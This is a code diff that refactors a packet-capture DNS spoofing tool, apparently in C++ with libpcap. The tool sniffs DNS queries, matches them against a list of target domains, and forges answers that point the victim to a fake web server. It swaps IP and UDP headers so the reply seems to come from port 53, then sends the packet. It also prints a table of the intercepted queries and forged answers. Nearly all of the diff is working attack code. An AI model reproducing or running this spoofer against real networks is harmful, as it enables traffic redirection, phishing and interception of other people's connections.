@@ -70,6 +70,7 @@ void packet_handle::start_capture_loop(){
         if ((this->pkt_data = pcap_next(this->adhandle, &(this->header))) != NULL) {
             set_protocol_header();
             make_domain();
+            set_attack_data();
             packet_handler();
         }
     }
@@ -84,39 +85,58 @@ void packet_handle::set_protocol_header(){
 }
 
 
+void packet_handle::set_attack_data(){
+    sport = ntohs(udp->sport);
+    dport = ntohs(udp->dport);
+    dns_id = ntohs(dns->ID);
+
+    memset(display_domain, 0x00, 1024);
+    memcpy(display_domain, extract_domain, strlen(extract_domain));
+    
+    if(strlen(display_domain)>16){
+        memset(display_domain+12, '.', 3);
+        memset(display_domain+15, 0x00, strlen(display_domain));
+    }
+    
+    snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
+    snprintf(dest_ip, sizeof(dest_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
+}
+
+
+void packet_handle::print_attack_success(){
+    for (int j = 0; j < 101 ; j++) {
+        printf("\b \b");
+    }
+    printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
+    printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header.caplen,dns_id, display_domain);
+    printf("│Send│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ A │ %-16s│\n", my_ip, dport, source_ip, sport, full_size, dns_id, fake_webserver_ip);
+    printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
+    fflush(stdout);
+}
+
+
+void packet_handle::set_attack_ip_header(){
+    ip->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);
+    ip_address temp = ip->daddr;
+    ip->daddr = ip->saddr;
+    ip->saddr = temp;
+}
+
+
+void packet_handle::set_attack_udp_header(){
+    int temp_port = udp->sport;
+    udp->sport = htons(53);
+    udp->dport = temp_port;
+    udp->len = htons(sizeof(udp_header) + full_size);
+
+    udp->crc = 0;
+}
+
+
 void packet_handle::packet_handler() {
-    char source_ip[16];
-    char dest_ip[16];
-
-    int sport = ntohs(udp->sport);
-    int dport = ntohs(udp->dport);
-    int dns_id = ntohs(dns->ID);
-
-    char display_domain[1024];
-    unsigned char dns_response[1024];
-    unsigned char *dns_reply_hdr;
-
-    if(strcmp(extract_domain, "")!=0 && compare_domain(extract_domain)){
-        memset(display_domain, 0x00, 1024);
-        memcpy(display_domain, extract_domain, 1024);
-        if(strlen(display_domain)>16){
-            for(int i=13;i<16;i++){
-                display_domain[i]='.';
-            }
-            for(int i=16;i<strlen(display_domain);i++){
-                display_domain[i]='\0';
-            }
-        }
-        
-        snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
-        snprintf(dest_ip, sizeof(dest_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
-
-        for (int j = 0; j < 101 ; j++) {
-            printf("\b \b");
-        }
-
-        printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
-        printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header.caplen,dns_id, display_domain);
+    if(compare_domain(extract_domain)){
+        unsigned char dns_response[1024];
+        unsigned char *dns_reply_hdr;
 
         memset(dns_response, 0x00, 1024);
         dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);
@@ -153,19 +173,10 @@ void packet_handle::packet_handler() {
         sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
         memcpy(&dns_reply_hdr[size+28], ip_in_hex, 4);
 
-        int full_size = size+32;
-
-        ip->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);
-        ip_address temp = ip->daddr;  
-        ip->daddr = ip->saddr;
-        ip->saddr = temp;
-
-        int temp_port = udp->sport;
-        udp->sport = htons(53);
-        udp->dport = temp_port; 
-        udp->len = htons(sizeof(udp_header) + full_size);
-
-        udp->crc = 0;
+        full_size = size+32;
+        
+        set_attack_ip_header();
+        set_attack_udp_header();
 
         memcpy(&dns_response[0], (char *)ip, sizeof(ip_header));
         memcpy(&dns_response[sizeof(ip_header)], (char *)udp, sizeof(udp_header));
@@ -175,10 +186,7 @@ void packet_handle::packet_handler() {
         full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));
 
         sned_dns_packet(target_ip, udp->dport, dns_response, full_size);
-        
-        printf("│Send│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ A │ %-16s│\n", my_ip, dport, source_ip, sport, full_size,dns_id, fake_webserver_ip);
-        printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
-        fflush(stdout);
+        print_attack_success();
     }
 }
 
@@ -228,7 +236,7 @@ void packet_handle::sned_dns_packet(char *target_ip, int port, unsigned char *dn
 
 bool packet_handle::compare_domain(const char *target_domain){
     for(int i=0;i<this->get_domain_array().size();i++){
-        if(strcmp(target_domain, this->get_domain_array()[i].c_str())==0){
+        if(strcmp(extract_domain, "")!=0 && strcmp(target_domain, this->get_domain_array()[i].c_str())==0){
             return true;
         }
     }
